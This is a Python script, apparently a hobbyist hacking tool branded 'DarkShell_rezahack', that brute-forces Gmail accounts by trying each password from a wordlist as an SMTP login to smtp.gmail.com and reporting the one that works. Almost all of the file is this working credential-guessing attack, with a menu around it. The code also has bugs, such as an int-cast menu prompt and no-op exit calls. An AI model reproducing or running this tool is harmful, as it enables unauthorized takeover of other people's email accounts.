import smtplib,os,sys,time

class colorma:
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDER = '\033[4m'
    #--- ITS END ---
    END = '\033[0m'

smtpserver = smtplib.SMTP("smtp.gmail.com:587")
smtpserver.ehlo()
smtpserver.starttls()

if(sys.platform == "linux"):
    os.system("clear")
else:
    os.system("cls")

def started():
    print(f"""{colorma.CYAN}
    ╔══[Coded by : C Security,{colorma.RED}[DarkShell_rezahack]{colorma.CYAN}]
    ║
    ╠═[1] Enter Your Gmail Target 
    ╠═[2] Help  
    ║
    ╠════[0] Exit
    ║   """)
    UID = int(input(f"    ╚════[Enter Your Gmail : {colorma.END}"))

    if(UID == 1):
        ano()
    if(UID == 2):
        help()
    if(UID == 3):
        exit

def ano ():
    email = input(f"\n{colorma.YELLOW}[!] Enter Your Gmail : {colorma.END}")
    if('@gmail.com' in email):
        email = email
        password_file = input(f"{colorma.YELLOW}[!] Enter Your Password Files : {colorma.END}")
        password_file = open(password_file, "r")
        password_file = password_file.read()
        password_file = password_file.split()

        for password in password_file:
           try:
               smtpserver.login(email,password)
               print(f"{colorma.GREEN}[{time.ctime()}][{email}] Password Found : {colorma.CYAN}",password,f"{colorma.END}")
               print(f"{colorma.GREEN}[+] Scaning Complate{colorma.END}")
               print(f"{colorma.GREEN}[+] password : {colorma.END}{password}")
               break
           except smtplib.SMTPAuthenticationError :
                print(f"{colorma.RED}[{time.ctime}][{email}] Passwor injections : ",password,f"{colorma.END}")
                print(f"{colorma.RED}[-] Not Find Password{colorma.END}")
        input("Enter Your Continue  :  ")
    else:
        print("[-] not gmail")
        y = input("[!] rty agin (y,n)")
        if(y == "y"):
            ano()
        if(y == "n"):
            exit
        if(y == "yes"):
            ano()
        if(y == "no"):
            exit
        if(y == "Y"):
            ano()
        if(y == "N"):
            exit
        if(y == "YES"):
            ano()
        if(y == "NO"):
            exit
        
def help():
    print(f"""\n{colorma.YELLOW}    ╔══════════════════════════════════════╗
    ║                                      ║ 
    ║ Codyd By C Security Team {colorma.RED}[DarkShell_rezahack]{colorma.YELLOW} ║
    ║           version 1.0                ║
    ║        programing : python           ║
    ║                                      ║
    ╠══════════════════════════════════════╝
    ║""")
    UID = input(f"    ╚═[Enter Your Continue  :  {colorma.END}")
    started()
    
started()